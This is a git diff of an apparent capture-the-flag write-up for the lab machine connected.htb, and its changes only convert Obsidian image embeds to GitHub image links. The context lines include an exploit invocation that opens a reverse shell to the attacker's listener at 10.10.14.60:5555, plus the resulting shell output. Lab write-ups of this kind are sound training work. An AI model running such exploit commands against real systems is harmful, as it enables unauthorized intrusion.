@@ -1,6 +1,7 @@
 
 
-![[Pasted image 20260730224853.png]]
+<img width="1602" height="303" alt="image" src="https://github.com/user-attachments/assets/fc38acd3-7fff-40fc-9398-8a83627d7a84" />
+
 
 
 
@@ -29,7 +30,8 @@ PORT    STATE SERVICE  VERSION
 ```
 
 
-![[Pasted image 20260730211143.png]]
+<img width="1918" height="815" alt="image" src="https://github.com/user-attachments/assets/4c450770-31e8-4496-8dc3-ac925d06f522" />
+
 
 
 ```
@@ -42,12 +44,15 @@ python3 exploit.py --rhost connected.htb --lhost 10.10.14.60 --lport 5555
 
 
 
-![[Pasted image 20260730213310.png]]
-
-![[Pasted image 20260730213337.png]]
+<img width="1054" height="712" alt="image" src="https://github.com/user-attachments/assets/ca02821c-5fd8-4800-87d4-7eaa66696bf8" />
 
 
-![[Pasted image 20260730213410.png]]
+<img width="1221" height="778" alt="image" src="https://github.com/user-attachments/assets/3ef55bfd-0eb1-4985-9b5f-cd25cb498395" />
+
+
+
+<img width="1260" height="771" alt="image" src="https://github.com/user-attachments/assets/6f5ad0b3-cd1e-49ae-86f4-278a39a5fde4" />
+
 
 
 
@@ -93,12 +98,15 @@ uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
 
 ```
 
-![[Pasted image 20260730224425.png]]
-
-![[Pasted image 20260730224442.png]]
+<img width="1241" height="766" alt="image" src="https://github.com/user-attachments/assets/d10a14a1-0c52-4f8e-963b-3e4b3d4b84a0" />
 
 
-![[Pasted image 20260730224608.png]]
+<img width="1204" height="660" alt="image" src="https://github.com/user-attachments/assets/d89291b5-bd1f-464d-80c5-4b53ec6f6d45" />
+
+
+
+<img width="1064" height="616" alt="image" src="https://github.com/user-attachments/assets/893fe318-b49a-45fc-a0bc-c0dc6f38a9d2" />
+
 
 
 ```
@@ -266,5 +274,6 @@ dr-xr-xr-x. 43 root root  4096 Nov 30  2025 ..
 
 ```
 
-![[Pasted image 20260730224827.png]]
+
+<img width="703" height="816" alt="image" src="https://github.com/user-attachments/assets/18f01fd8-178e-458f-8849-c7cf065df751" />
 
